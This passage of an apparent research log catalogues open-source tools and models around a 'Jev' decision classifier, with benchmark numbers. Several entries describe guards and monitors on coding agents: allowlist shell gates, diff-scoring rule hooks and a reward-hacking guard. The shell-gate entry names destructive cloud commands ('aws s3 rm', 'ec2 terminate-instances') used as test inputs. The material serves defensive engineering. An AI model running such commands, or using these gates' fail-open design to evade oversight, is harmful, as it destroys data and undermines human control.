[`perixtar/jev-e2e`](https://github.com/perixtar/jev-e2e),
[`yalindogusahin/jevpandas`](https://github.com/yalindogusahin/jevpandas).

### HIGH

1. **[`BlackwoodAI/blackwood-rlcd`](https://huggingface.co/BlackwoodAI/blackwood-rlcd)**
   (Hub, 2026-09-18 v1; `pipeline_tag: image-text-to-text`; CC BY-NC 4.0;
   likes=1 this pass). **Open multimodal RLCD decision model.**
   Screenshot or text in; Choice / Score / Boolean out in one prefill;
   Jev-compatible `/v1/systemone` shim. Options listed as letters;
   answer from option-letter logits at the last position; temperature-
   calibrated; no sampling; `output_tokens` always 0. Not Archer's 27B
   drop. Not CLIP/SigLIP (those are vision *scorers*). Same *decide*
   species as Jev / Laya / kev, with image-in.

   **Architecture (load-bearing).** Omni perception→decision can ship
   **without waiting for Archer**. Soft judgment over **pixel
   candidates code already marked** (letters drawn on the screenshot;
   criteria keyed by those letters) inside a deterministic click/act.
   Specialist composition (SAM / OCR / AX → text → Jev) still exists
   (`§39`); this is the shared multimodal System One that card was
   waiting for. Information still dies at the *act*: the model picks a
   letter; code clicks. A Noul is still not a proof. CC BY-NC: research
   / personal, not a commercial drop-in. Do not copy vLLM flags, the
   shim, or curl bodies into skill cards.

   **Evidence (model card; paired per item; not re-run; Empirical as
   their named receipt).** Web element choice, 300 held-out steps:
   acc **0.907** vs Jev 1.13 text-only **0.480**; letter-shuffle flip
   **0.133** vs **0.587** (lower better); ECE **0.037** vs **0.091**;
   latency **~200 ms** (1×H100) vs 441 ms (Jev via OpenRouter).
   4-lettering (four orderings averaged, 4× compute) acc **0.953**.
   Desktop held-out acc **0.76** vs **0.654**. NL predicates over
   records **0.973** vs **0.965**. Tetris lines / 60 pieces **14.2** vs
   **13.6**. General text, 85 public sets / 8,456 items: blackwood
   **0.786**, Jev **0.850** — Jev still leads. Domain sets 27 / 12,746:
   **0.710** vs **0.703**. Pixel rows use a randomized viewport crop.
   Jev is text-only by design: screenshot rows compare screenshot
   input with Jev's *text* input on the same steps. **Hypothesis** that
   it substitutes for Jev on *your* labels. Boolean questions on skewed
   sets can be over-confident (their limit). Cards: `judgment-class.md`
   (family, holes, when-to-use, dedicated card, perception rewrite);
   FAQ wait-for-Archer; `validation.md` letter-shuffle; `formal-methods.md`
   one sentence; `mixed-architecture.md` gallery; `applied-mappings.md` §2.

2. **[`pngwn/open-jev-laya-bench`](https://huggingface.co/datasets/pngwn/open-jev-laya-bench)**
   (`RESULTS.md` this pass; no dataset README). Shared bake-off:
   [`pngwn/system-one-qwen3.5-4b-scorer`](https://huggingface.co/pngwn/system-one-qwen3.5-4b-scorer)
   `@ e6464dce` vs [`convaiinnovations/laya`](https://huggingface.co/convaiinnovations/laya)
   `@ 7c76b622`. **26 neutral + 9 home** tasks, **11,959** test items,
   **3,269** cal items. Hardware: NVIDIA A100-SXM4-80GB. Config chosen
   on `cal` (scorer vs `laya_text`). **Not TypeSafe Jev vs Laya** — do
   not launder this table into a proprietary-Jev ranking. Laya's
   published in-task acc/ECE sit on unpublished sets and are context,
   not like-for-like.

   **Harbor / jevals practice in the wild.** Measurement substrate
   exemplar: accuracy + **ECE / NLL / Brier** (and acc@50% coverage),
   held-out `test`, temperature chosen on `cal`, leave-one-task-out,
   prompted-base / prompted-instruct arms on the same 4B, per-task T
   vs shipped T. **LLM-as-judge is not the primary System One score.**
   That is the eval path the skill already wanted (`validation.md`
   Eval & hill-climb; `notes.md` §40). Do not copy the scoring scripts.

   **Evidence (`RESULTS.md`; not re-run; Empirical as that named
   receipt).** Neutral, shipped T: System One 4B macro acc **0.760**,
   Laya **0.737**, Δ **+0.023 [+0.013, +0.032] \*** (interval excludes
   0). Neutral ECE-10 **0.074** vs **0.122**; macro NLL **0.569** vs
   **1.272**; macro Brier **0.324** vs **0.392**. Home (the 4B's own
   held-out split): **0.715** vs **0.486**, Δ **+0.229 [+0.198, +0.262]
   \***. Home ECE-10 **0.072** vs **0.272**; NLL **0.697** vs **3.836**;
   Brier **0.363** vs **0.759**. Ahead on 13/26 neutral and 8/9 home.
   Neutral prompted-instruct (same 4B, ≤26 options) macro acc **0.763**
   vs fine-tune **0.760**, Δ **+0.003 [-0.004, +0.011]** — interval
   includes 0; do not slogan "fine-tune always wins zero-shot." Home
   prompted arms drop banking77 / ticket-queue (enum >26). Latency
   one-question p50 on the same GPU: tweet_emotion Laya 27.9 ms vs
   scorer 76.7 ms; home_banking77 (K=77) 30.0 vs 382.8 ms. **Hypothesis**
   as a ranking of *your* head. Cards: `validation.md` bake-off; FAQ
   LLM-as-judge; `judgment-class.md` Laya companion.

3. **[`Foodoo1/Qwen3-14B-RLCD-Decision-LoRA`](https://huggingface.co/Foodoo1/Qwen3-14B-RLCD-Decision-LoRA)**
   (Apache-2.0 adapter; base `Qwen/Qwen3-14B`; PEFT). **Decision-token
   QLoRA** under **parallel constrained decoding**: one prefill, KV
   broadcast across fields, logit slice over candidate first tokens —
   the TypeAR / pcdServer / `stephanj/parallelConstraintDecoding`
   inference pattern (`findings.md` batch #1). Loss computed **only on
   the single decision token** of each field. The base already hits
   easy fields (language/sentiment 100%); reasoning-heavy fields fail
   because the decision happens at one token with no room to think.
   Pattern, not a fraud product: train the decision token, do not
   fine-tune generated prose. Evaluated with
   [`harshatheg/Qwen-2.5-1B-RLCD`](https://huggingface.co/harshatheg/Qwen-2.5-1B-RLCD)
   inference code (that Hub repo still has no weights — stock Qwen +
   custom code; already archived). Synthetic fraud-triage schema;
   **do not use for real financial decisions** (their limit). Do not
   copy the prompt or LoRA flags into skill cards.

   **Evidence (card; held-out 200-case, 4 fields, 4-bit NF4, RTX 3090;
   not re-run).** fraud_risk (4-way) **64.0% → 95.0%**; block_account
   **77.0% → 100%**; language and sentiment stay **100%**; overall
   (800 decisions) **85.2% → 98.8%**. Mean latency **~234 ms** per
   case (all 4 fields in one broadcast). Remaining errors all
   LOW→ELEVATED (conservative); zero high-risk judged low. Train:
   16,608 single-token examples from 4,152 synthetic cases (648
   templates × 72 messages EN/ZH/ES/JA), 1 epoch, ~97 min on one 3090.
   **Empirical** as that named receipt. **Hypothesis** as a general
   recipe on *your* schema. Cards: `judgment-class.md` constrained-AR;
   `methods-catalog.md`; FAQ open-weights vs constrained decode.

4. **[`thevibeworks/jevgate`](https://github.com/thevibeworks/jevgate)**
   — already §25 / `mappings.md` §18. This hour the *mental model*,
   matching the GitHub description: **an allowlist proves** every verb
   is a listed read-only tool; **Jev judges only unlisted** leftovers;
   **fail-open (cannot block)**. Hard envelope in code + soft judgment
   only on the residual. Proven runs in 4 µs and never leaves the box;
   Refused never asks the model (so a comment cannot talk a writer
   through); Unknown is five Nouls, admit iff every p < 0.2. Jev on
   `/bin/ls` alone leaks (0.04) — that is why it is the third tier.
   Real-traffic counts already on the README (116,979 Bash calls:
   26.4% proven; 16.2% reach Jev; 47 admitted, all read-only by hand)
   stay author-reported; do not re-promote 0/59 as if new. MIT. 0★
   this pass. No rewrite of the 0.2 threshold as a constant. Cards:
   `mappings.md` §18 "proves"; FAQ allowlist-then-judge; methods-catalog.

5. **[`suraj-phanindra/wellposed`](https://github.com/suraj-phanindra/wellposed)**
   (MIT, JS, 0★, created 2026-09-17). **Lint the request before it
   comes back confidently wrong.** Neighbor-skill identity: `tenbin`
   still owns design-time lint/measure; this is an Empirical *recipe*
   of that hole, not a second Augustus skill and not a wellposed
   how-to. Standing Choice contract (`SKILL.md`): probabilities are
   conditional on the offered set; absent candidates can never be
   chosen; add `other` where coverage is open. wellposed is the
   receipt that **violating that contract is silent**.

   **Evidence (README; not re-run).** 40 generated requests: **0/40**
   syntax errors (API validation already covers that); **16/40 (40%)**
   asked something that did not make sense; **0/11** list-questions
   included a none-of-the-above. Live probe: unsubscribe email, four
   department options, no `other` → `"support issue"` **confidence
   1.00**; with `other` → `"other"` confidence 0.93. Overlapping
   `angry`/`furious` collapsed confidence to **0.19** — loud; ordinary
   gates catch it. Forced wrong Choice is quiet. Structural lint (35
   rules, offline) then optional jev-on-jev semantic layer. Labeled
   corpus: recall **22/26 = 85%**, precision **22/24 = 92%** (computed
   live from the corpus). Honest limits: one-model labels, so 40% is a
   floor; 2026-09-18 adversarial audit added 36 items because the
   metric could not see ordinary-English false positives. Broken state
   paths (`ticket.assigned_agent.name` with no such path) are
   *provably* wrong. Confidence gating **cannot** catch a forced
   Choice. Cards: `question-design.md` diagnosis; validation gate #2;
   FAQ; tenbin identity lock.

6. **[`khordoo/jev-reflex-autonomy-lab`](https://github.com/khordoo/jev-reflex-autonomy-lab)**
   (TypeScript, 0★, created 2026-09-18T19:46Z; GitHub license null this
   pass). Interactive multi-drone lab. **S1 Jev reflex keeps control**;
   optional S2 planner (OpenRouter / GLM 5.3) is **one-use advice** on
   low confidence. Jev does not pause while the planner responds. S2
   does not fly the drone. Kahneman row already taught the split
   (`toolbox-mapping.md`: S2 proposes, S1 discriminates; never the
   reverse) — this is that split as a control loop, not a flight
   controller. Experimental visualization; mock mode without keys;
   live fleet success varies. No metrics to promote. Do not copy the
   adapter, `.dev.vars`, or ports. Cards: `mixed-architecture.md` dual
   orchestration; `agent-self-assessment.md`; toolbox Kahneman row.

### MED (pointers, not cards of their own)

7. **[`Wany-i/jev-decision-layer`](https://github.com/Wany-i/jev-decision-layer)**
   (MIT, Python stdlib, 0★). Wrap the decision model as a **business
   decision tool**: caller names the *judgment*, not the model.
   `decide(name, fields)` → outcome + confidence + **`gate` (part of
   the result)**. Registry JSON; hard guards in code; `other` required
   on Choice. OpenRouter `POST /api/alpha/decisions` (not
   `chat/completions` — that 400s). Text-only: screenshots must be
   textualized — contrast with blackwood. 28 offline tests, no key.
   Unofficial. Do not copy the registry or MCP install.

8. **[`perixtar/jev-e2e`](https://github.com/perixtar/jev-e2e)**
   (MIT, TypeScript, alpha, 0★). Natural-language cases; Jev selects
   observed controls; **Playwright executes and independently checks
   expectations**. Verdicts PASS / FAIL / BLOCKED. A completed
   navigation or a confident model response **cannot substitute for
   checked expectations**. Harbor/jevals practice on a browser taskset
   (score on the task; harness rolls out). Alpha: controlled demo does
   not establish reliability across arbitrary sites. Do not copy CLI
   flags or ports.

9. **[`yalindogusahin/jevpandas`](https://github.com/yalindogusahin/jevpandas)**
   (Python; GitHub LICENSE 404 this pass). pandas frame as the store:
   `evaluate` / `filter` / `classify` / `score` / batched `ask`.
   Classify example includes `other`. Failures never become negative
   predictions. No generative chat, no joins, no training on review
   labels. Store-as-semantic-index cousin of jevql / sqlite-jev
   (`mappings.md` §4) over a dataframe instead of SQL. Samples in
   `data/` are synthetic. Do not copy the client.

Cards: `judgment-class.md`; `validation.md`; `question-design.md`;
`mappings.md` §18 / §4; `mixed-architecture.md`; `faq.md`;
`agent-self-assessment.md`; `mental-models.md`; `formal-methods.md`;
`applied-mappings.md` §2; `methods-catalog.md`; `toolbox-mapping.md`.
No wrapper.

## 47. Abide — productized soft-rule preference lint (2026-09-18)

America/Boise ~14:34 = 20:34 UTC. Docs-only fold into open PR #2
(`cursor/augustus-store-envelope-00b4`). Not a competing PR. Archer
27B drop still **WATCH**. Identity lock vs `typesafe-ai` / `tenbin` /
`decision-first` holds. No wrapper, no hook how-to, no copied `npx` /
init / ports. Text/diff only — **not multimodal**. Do not invent
metrics.

HTTP 200 this pass: GitHub README for
[`coldteadotai/abide`](https://github.com/coldteadotai/abide)
(MIT, TypeScript, created 2026-09-18, npm `@coldtea/abide`, 4★ this
pass); replay method in-repo at `benchmarks/replay/README.md`.
Attached SIGNAL + replay README + repo.json as primary placement
guidance.

### HIGH

1. **[`coldteadotai/abide`](https://github.com/coldteadotai/abide)**
   — productized Jev hooks for Claude Code / Codex / OpenCode that
   enforce **soft project rules** (AGENTS.md / CLAUDE.md / instruction
   files) no linter can check. On every edit (or turn) it asks Jev
   **one Score / probability per rule against the diff only**, never
   the conversation. A break names the rule and asks the agent to
   repair in-session. jev-pref already stated the contract (YOU define
   the rule / Jev classifies / code maps outcome). Abide is the
   fuller productized path: compile / calibrate / tune / replay /
   audit + multi-host. Do not clone the CLI.

   **Architecture (load-bearing; not a hit list).**

   1. **Soft rules → soft judgment; hard rules → linter.** Rules a
      linter can check are handed to the linter. Same layering family
      as jevgate's hard envelope (`mappings.md` §18): structure
      **proves** what it can; typed judgment only on the residual.
      jevgate's remainder is unlisted shell verbs; Abide's remainder
      is project-instruction soft rules. Different holes; same
      sandwich. Soft judgment is never the sole hard veto.
   2. **Edit-phase vs turn-phase is an observation-window question.**
      Each compiled rule runs at `edit` (this hunk) or `turn` (the
      whole turn diff). "Did this add more than was asked?" has no
      answer after edit 1 of 12. Question design must name when the
      evidence exists (`question-design.md`).
   3. **Banded confidence + fail-open.** Their product bands: ≥0.8
      repair in-session; 0.5–0.8 human note, agent silent; <0.5
      silence. That 0.8 is **their** operating point, not a universal
      threshold (`mappings.md` §2 already forbids magic 0.8). Hooks
      always exit 0, hard deadline; no key / no network → the edit
      proceeds and the miss is logged. Soft judgment never sole hard
      veto.
   4. **Rubric as editable artifact.** `.abide/rubric.json` quotes the
      source instruction line. A wrong verdict is a rule rewrite.
      `calibrate` scores rules against recent git history; `tune`
      rewrites dead rules. False positives live in the question
      (scope, criteria), not in the model.
   5. **Eval honesty / Harbor-adjacent.** Replay of 93 real Claude
      Code sessions against each repo's own AGENTS.md (two private
      repos + public `pr-lens`; hunks unpublished). Nothing is
      re-run: diffs come from transcripts. Independent reviewer
      (Claude, reading each rule's own text strictly; owner
      spot-checked four first-pass comment flags and agreed). Replay
      does **not** measure whether the agent repairs when told.
      Harbor/jevals practice in the wild: frozen transcripts, phase
      split, independent confirmation — not a Harbor taskset and not
      a second jevals (`validation.md`).

   **Evidence (README + `benchmarks/replay/README.md`; not re-run;
   Empirical as that named receipt).** 93 sessions with edits; 1,256
   edits judged; 147 turns judged; Jev cost **$0.22**; wall **~2
   min**. Edits flagged at 0.8+: **39 (3.1%)**. Turns flagged at
   0.8+: **15 (10%)**. After independent review: edits **10/39 =
   26%** precision; turns **11/15 = 73%**; all **21/54 = 39%**.
   Author's gloss: 8 confirmed violations per 1,000 edits; 1 turn in
   13 ends with a confirmed violation of a rule no linter could
   express; 11 of 93 sessions contained at least one. Recall probe
   from 20 cleared hunks closest to the line (0.31–0.48): one real
   miss (props-ordering). Most false positives from two edit-phase
   rules (`plain-error-for-expected-failure`, `comment-volume`) —
   fixable with `scope` and criteria, which is what calibrate / tune
   exist for; the table is **before** either ran on the tightened
   rubric. No turn-number drift: pr-lens-app flat ~2.5% through early
   / mid / late turns; coldtea falls 5.8% → 1.3% because big
   new-file writes happen early. Agents break these rules from the
   first edit at a steady rate. Economics (README, author-measured
   2026-09-18, direct to TypeSafe): a check was ~2,500 tokens with an
   ordinary LLM (cent+, seconds, prose to parse); Jev ~300 ms,
   **$0.00004–0.00007** per check on this repo's 13 rules (1,000–1,600
   input tokens). Do not promote those $ / ms figures as class
   constants.

   **Siblings — complementary, do not merge.**

   - **`doeixd/jev-pref`:** earlier watch; the contract Abide
     productizes. Keep the contract quote; point here for compile /
     calibrate / tune / replay / multi-host.
   - **`24601/rh-guard`:** reward-hacking / eval-integrity on agent
     tool use. Abide: project-instruction soft rules on diffs. Same
     hook-host surface, different judgment class. Shared fail-open /
     host-adapter lessons; no code dependency.
   - **`suraj-phanindra/wellposed`:** request-shape lint still
     upstream of any Score call (`tenbin` owns the skill).
   - **`thevibeworks/jevgate`:** hard envelope owns safety; Abide is
     soft residual judgment on residual soft rules.
   - **`huntedman/JevLint`:** file-level convention Nouls; sibling,
     not a substitute.

   **Placement.** Verifier over rules the project already wrote
   (`mixed-architecture.md` preference lint; composition-algebra #9).
   Pillar: selective classification / abstention + structural-prove ∩
   remainder. Hole: gate. Family: closed decision API (typed Score
   per rule). Fail-open, banded. Eval path: replay + independent
   review (named receipt above); not a substitute for jevals/Harbor
   on *your* rubric. **Empirical** as README + dated replay. **Hypothesis**
   that the same bands / precision transfer to *your* AGENTS.md.
   Cards: `mixed-architecture.md`; `question-design.md`;
   `validation.md`; `mappings.md` §2 / §18; `faq.md`;
   `agent-self-assessment.md`; `toolbox-mapping.md`;
   `methods-catalog.md`; `mental-models.md`. No wrapper.

### Omni / Jev-omni

Text/diff only today. Usage + measurement exemplar (replay harness,
precision by phase). Not a multimodal substrate and not a reason to
wait on Archer.

## 48. Extractive selection, pointer-not-generator, local contract drop-in (2026-09-18 ~14:52 Boise)

America/Boise ~14:52 = 20:52 UTC (run 205210). Docs-only fold into
open PR #2 (`cursor/augustus-store-envelope-00b4`). Not a competing
PR. Archer 27B drop still **WATCH**. Identity lock vs `typesafe-ai` /
`tenbin` / `decision-first` holds. No wrapper, no install.sh, no
copied ports / Docker / PyPI how-tos. No invented metrics. Do not
re-fold blackwood-rlcd, open-jev-laya-bench, decision-token LoRA,
jevgate, wellposed, jev-reflex-autonomy-lab, Abide, kev, jevpandas,
bitrate-advisor.

Backend-agnostic: these are categorization / scoring *placements*
(extractive keep/drop, pointer evidence, contract-compatible local
scorer, structured observe→decide→act, dataframe columns, route≠memory,
advisory sidecar, structure induction, AST∩semantic). TypeSafe Jev is
the exemplar in the READMEs, not a monopoly.

### HIGH

1. **[`AppitStudio/testimonial-miner`](https://github.com/AppitStudio/testimonial-miner)**
   (MIT, Python, created 2026-09-18T20:42Z, 0★ this pass). Gmail/IMAP
   → numbered sentences in **code** → **one** typed request per email
   (Choice kind + app, Nouls for user/praise/problem/English, Score
   quotability, **one Noul per sentence**). **The model never writes
   text.** The stored quote is the sender's sentences, selected by
   those Nouls and joined in order. All thresholds live in
   `Thresholds` and `redecide` reapplies them to logged answers
   **without new model calls**. Header rules skip newsletters /
   outbound / quoted replies before any call. Pattern: **extractive
   selection + multi-question broadcast + offline re-thresholding.**
   Cousin of exact-text keep/drop (`applied-mappings.md` §2), not a
   testimonial product and not a Gmail how-to.

   **Evidence (README; not re-run; Empirical as that named receipt).**
   Developed against `typesafe-sdk` 0.7.0 / `jev-1.13.0`. Their
   *product* bars (not class constants): candidate if user ≥0.5,
   praise ≥0.6, quality ≥1.5 on 0–3; borderline praise ≥0.35 /
   quality ≥1.0; quote sentences ≥0.6. Live fixtures (8 requests,
   ~22k input tokens): **5** candidates, **3** rejected, **3** header
   skips. Offline tests use fakes and say nothing about model
   accuracy. Author cost gloss: ~$0.042 / M input; typical email
   2–3k tokens; 10k judged emails ~$1. Do not copy IMAP setup.
   Cards: `applied-mappings.md` §2; `mappings.md` §2; `methods-catalog.md`.

2. **[`choxos/jev-reviewer`](https://github.com/choxos/jev-reviewer)**
   (MIT, JavaScript, 1★, created 2026-09-18T14:47Z). Systematic-review
   data extraction: PDF/Office/HTML/CSV stay in the **browser**;
   segmenter assigns line ids (`A001`…); the decision model **points
   at ids**; **code copies verbatim quotes with file and place**.
   Nothing is paraphrased, so nothing can be invented. Two-pass:
   screening Choice "which line answers q?" (+ none) over chunks,
   then verifying Nouls "does this line itself answer q?". **Not
   found is an answer.** Speculative fan-out: every question against
   the same text. Pattern: **pointer-not-generator** for evidence
   synthesis / citation integrity. Same species as keep/drop over
   candidates code already holds; GLiNER locate is the cousin when
   the answer *is* a span the encoder proposes.

   **Evidence (README; sample study, Sep 2026; not a validation
   study).** 17-page article + 12-page analysis plan + CONSORT,
   712 lines: 1 question 10 req / 1.2–2 s / $0.0016; 9 questions
   17 / 2.3 s / $0.0052; 18-question template 27 / 4.6 s / $0.0101.
   Chunks of 12k characters matched 7k with a third fewer requests.
   Treat as spot checks. Scanned PDFs need OCR first (their limit).
   Do not copy the relay. Cards: `applied-mappings.md` §2;
   `methods-catalog.md` claim–evidence; `mental-models.md`.

3. **[`us/jev-local`](https://github.com/us/jev-local)**
   (LICENSE absent this pass; Python; 0★; created 2026-09-18T19:28Z).
   Local `POST /v1/systemone` drop-in (Docker / `pip` / SDK
   `base_url`). Open-weights *path*, no waitlist. **Default scorer is
   a deterministic stub and carries no intelligence** until
   `JEVLOCAL_SCORER=hf`. That flag is load-bearing: a green smoke
   test on the stub is not a local Jev. Pattern: **contract-compatible
   local scorer for offline/dev**, beside kev's Hub drop-in and
   Laya's native head — not a fourth species. Their README: interface-
   compatible baseline, **not a reproduction of Jev's undisclosed
   model or training**. Softmax ignores level ordering; option order
   can shift logits. Do not copy `install.sh`, ports, or model ids
   into skill cards.

   **Evidence (README; Empirical as *their* named tables, Hypothesis
   on *your* labels).** Official `typesafe-sdk==0.6.0` with only
   `base_url` pointed at the server (4B backend) is the drop-in
   proof. When `hf` is on they publish Wilson-CI / ECE / NLL tables
   on templated sets (set1 / set2 / set3); do not re-promote those
   rows as a ranking of TypeSafe Jev. Head-to-head vs published
   jev-1.13.0 on 5 questions: 4/5 top-answer agree; payout
   billing-vs-technical is an ambiguous prior, not a prompt bug.
   Cards: `judgment-class.md`; `faq.md`; `validation.md`.

4. **[`hitakshiA/solari-reflex`](https://github.com/hitakshiA/solari-reflex)**
   (MIT, TypeScript, 0★, created 2026-09-18T15:24Z). Computer-use
   **speed layer** on Solari (browser + Linux desktop): **one
   structured observation → one typed decision → one verified
   action**. **No screenshots in the loop.** Observation is
   numbered controls / a11y tree / visible text (Calc: used visible
   rows, never 2³¹ cells). Decision: which operation, which target
   (speculative, same request), done/blocked. Write: a small model
   only for TYPE as strict JSON. Act: guard check, refuse covered
   controls, pipeline input; model output **never** becomes a
   selector, coordinate, or script. Deny lists are **absent from the
   question**, not merely disfavoured. Sibling of
   `browser-use/jev-ultrafast` / jev-use / typesafe-computer-use.
   Pattern: **perception → decision → act** with Harbor-style
   measurement (score the task; independently checked by the app /
   Stripe API / answer key).

   **Evidence (README + [solari-fast-showcase](https://github.com/hitakshiA/solari-fast-showcase);
   vs Codex CLI GPT-6 Astra on the same Solari machines; not re-run).**
   Stripe Checkout (qty 2, promo, card): **60.2 s**, $0.011 vs
   **194.9 s**, 34 tool calls. Six different Stripe checkouts:
   **66 s**, $0.064 vs **460 s**, 86 tool calls. 30 Calc expenses:
   **24.2 s**, $0.0008 vs **98.4 s**, 77 tool calls. Ratios on that
   table sit in ~3–7×. Their step table: decide ~400 ms / ~$0.0001;
   TYPE write ~600 ms. **0.6** is *their* Advisor handoff, not a
   universal threshold. Do not copy npm git-install. Cards:
   `mixed-architecture.md`; `validation.md`; `applied-mappings.md` §2;
   `agent-self-assessment.md`.

5. **[`ktaletsk/jevframe`](https://github.com/ktaletsk/jevframe)**
   (MIT, Python 3.10+, PyPI `jevframe`, pandas **and** Polars,
   created 2026-09-18T17:06Z, 0★). `.jev` accessor: `noul` / `choice`
   / `score` / `evaluate` with **full probability columns** (`p__…`),
   preserved row order/indexes, one input row per request, questions
   about a row share the request, default `max_concurrency` 16.
   **No result is thresholded or silently renormalized.** `score` is
   the expected zero-based level, not a probability. Sibling of
   [`yalindogusahin/jevpandas`](https://github.com/yalindogusahin/jevpandas)
   (`notes.md` §46): both are dataframe-native semantic columns;
   jevpandas is the store-as-index cousin (`evaluate`/`filter`/
   `classify`/`score`); jevframe is the accessor + Polars + packed
   struct layout. Neither is SQL `jev()`. Pattern: **dataframe-native
   semantic columns** (class, not vendor). v0: no chat, no generated
   records, no custom dtypes. Do not copy the client. Cards:
   `mappings.md` §4; `mixed-architecture.md` gallery.

### MED (pointers, not cards of their own)

6. **[`de-niji/jev-hermes`](https://github.com/de-niji/jev-hermes)**
   (MIT, Python, 0★). Intent **gate before a Hermes turn**:
   `calendar` / `mail` / `status` → config + flat tools, **no memory
   search spam that turn**; `complex` / people / prefs / "what did
   we…" → memory + normal agent. Memory providers still **write** in
   the background. Token savings come from skipping long tool/memory
   *tours*, **not from turning memory off**. Pattern: **route ≠
   memory**; S1 gate preserves S2+memory for hard routes. OpenRouter
   `POST /api/alpha/decisions` (same surface as jev-decision-layer).
   Do not copy `docker cp`. Cards: `applied-mappings.md` §5;
   `mixed-architecture.md` dual orchestration.

7. **[`ngallodev-software/agent-workflow-typesafe-ai`](https://github.com/ngallodev-software/agent-workflow-typesafe-ai)**
   (Apache-2.0, Python, 0★). Advisory-only host plugin. Projects
   bounded redacted evidence into typed questions; normalizes answers
   into versioned secret-free **semantic receipts**. **Never changes
   host routing**, executor, model policy, lifecycle, evaluation,
   review, or acceptance. Missing credentials / SDK / uncertain
   answers / failures → distinct `no_action` outcomes. Pattern:
   **soft sidecar receipts** (fail-open evidence). Complementary to
   Abide (Abide is in-session Score on a diff; this is advisory
   metadata the host may ignore). Do not copy the TOML.

8. **[`Joymfl/dag-jev`](https://github.com/Joymfl/dag-jev)**
   (Rust + petgraph; README empty this pass; 0★; created
   2026-09-18T20:42Z). GitHub description: DAG from unordered items
   via Jev. Source: pairwise "does task i depend on j?" over a bag
   of numbered steps (reads/writes in `input.txt`); answers intended
   to build a `petgraph`. Experiment; graph wiring incomplete in
   `main.rs` this pass; **no metrics**. Pattern: **structure
   induction over bags** — code owns the DAG; the model only answers
   pairwise (or Choice) dependency questions. Do not clone the
   request builder. Cards: `mappings.md` §9 / §5.

9. **[`knowlet/jev-agentworld-web-simulator`](https://github.com/knowlet/jev-agentworld-web-simulator)**
   (MIT, TypeScript, 0★). Fictional web: Jev Choice for **search
   intent** and (same request) **layout / palette**; an
   OpenAI-compatible generator writes `SearchDocument` /
   `PageDocument`; Zod validates; a **deterministic** compiler emits
   json-render spec; SQLite is the world. Model cannot add
   components or handlers. Mock mode does **not** silent-fallback
   to live. Pattern: **decision for control, generator for content**
   in a simulated world. Live smoke (when run) is an integration
   test (budget **3 Jev + 3 generator**), **not** calibration or
   world-consistency. Offline CI: 27 unit/contract + 2 Chromium
   browse tests; [CI #2](https://github.com/knowlet/jev-agentworld-web-simulator/actions/runs/35391369860)
   on `b1dd6d7` passed. Do not copy `.env`. Cards:
   `mixed-architecture.md`.

10. **[`ufx7/jev-testbench`](https://github.com/ufx7/jev-testbench)**
    (LICENSE absent this pass; TypeScript; 0★). Two tools: black-box
    **determinism / latency / context / concurrency** (`src/bench/`);
    collaboration harness (`src/collab/`) with three arms —
    `llm_autonomous` (unconstrained; illegal actions tracked),
    `scripted_plus_jev` (code enumerates legal actions; Choice
    picks; **no LLM**), `llm_plus_jev` (LLM proposes; Choice
    arbitrates on the legal set; low p escalates then **stops**
    rather than guessing). **Jev is not a peer arm.** Reports
    Wilson intervals, exact McNemar per level (p < 0.05 **and** ≥5
    discordant pairs), ceiling-effect flags, cost/latency **per
    model**. Pattern: bake this into the jevals/Harbor **measurement
    curriculum**, not a second product. Grid-task demo uses a mock
    LLM to prove the harness; swap before trusting a real model.
    Cards: `validation.md`.

11. **[`alexykn/jevscan`](https://github.com/alexykn/jevscan)**
    (MIT, Python 3.12+, `0.2.0rc4`, 0★). Tree-sitter extracts
    lexical units (Python/Rust/Perl/TS/JS); typed questions on
    those targets; **does not execute or import the scanned code**.
    Release candidate: **not a claim of calibrated semantic
    accuracy.** Pattern: **structural AST + semantic judgment
    compose** (sibling of riff / JevLint / Abide). `tenbin` still
    owns the lint *skill*; this is a recipe of AST∩remainder, not
    a second Augustus skill. Do not copy YAML. Cards:
    `toolbox-mapping.md` spec/lint; `mixed-architecture.md`.

12. **[`phin-tech/pi-jev-approver`](https://github.com/phin-tech/pi-jev-approver)**
    (LICENSE present this pass; TypeScript; 0★). Pi **shell safety
    gate**. Facts (git branch, path scope, registry-publish regex)
    computed in code; typed Score `risk_level` + Nouls + Choice
    `primary_concern` on the remainder. `commandRules` regex
    **short-circuits** allow/deny — a `deny` rule is a hard block
    no LLM or human prompt can overturn. **No key → fail closed.**
    Optional LLM escalation can only reduce how often you are
    asked, never replace the human as last resort. Author
    side-by-side (their `jev-test` project): classification
    **~500 ms** vs **~2.5–3.5 s** chat-model. Live-tested: `aws s3
    rm` 1.72/2, `ec2 terminate-instances` 1.80/2 in the ask band;
    read verbs matching `action: allow` never called the model.
    **Light note only** — rh-guard-adjacent (coding-agent tool
    gate), different remainder from jevgate (unlisted verbs) and
    Abide (soft project rules). Do not copy the Pi install.

13. **[`Mattepiu/laya-onnx`](https://huggingface.co/Mattepiu/laya-onnx)**
    (Apache-2.0 ONNX export of [`convaiinnovations/laya`](https://huggingface.co/convaiinnovations/laya);
    Hub likes **1** this pass; updated 2026-09-18T10:45Z). Open
    **replica deployment path**: non-autoregressive marker-token
    head in onnxruntime. Card example: **~15 ms on CPU** for one
    Noul. **Do not copy the inherited vs-Jev accuracy table** —
    those rows remain vendor claims (`notes.md` §18,
    `judgment-class.md`). Pattern: ONNX/runtime port of a trained
    decision-only head, beside Laya native and kev Hub. Not Archer.

### Spotcheck (not a fold)

- **[`TheoLeeCJ/SemIf`](https://github.com/TheoLeeCJ/SemIf):** **1551★**
  this pass (2026-09-18T20:51Z). Watch cited awesome claim **1491**
  → **+60**. Independent; not affiliated with Jev/TypeSafe.
- **[`vinnylarouge/jevlike`](https://github.com/vinnylarouge/jevlike):**
  **866★** this pass.
- **Awesomejev 488 / 21644:** watch cited "unchanged." This pass did
  **not** independently re-derive 488/21644.
  [awesomejev.com](https://awesomejev.com/) still showed **410
  entries / 10,093 stars** (refreshed 2026-09-17) in the public
  snapshot fetched here. Do not invent a new count.
- **Tracker** [`multimodalart/jev-reproductions-tracker`](https://huggingface.co/spaces/multimodalart/jev-reproductions-tracker):
  Hub `lastModified` **2026-09-18T20:12:57Z**. Space `models[]`
  still lists **`convaiinnovations/laya`**. **`BlackwoodAI/blackwood-rlcd`
  is not in that array.** Archer remains a *promised* trained-head
  card. Omni decide that shipped (blackwood) is still off the
  tracker this pass.

Cards: `judgment-class.md`; `validation.md`; `applied-mappings.md`
§2 / §5; `mappings.md` §4 / §9; `mixed-architecture.md`; `faq.md`;
`mental-models.md`; `methods-catalog.md`; `toolbox-mapping.md`;
`agent-self-assessment.md`. No wrapper.

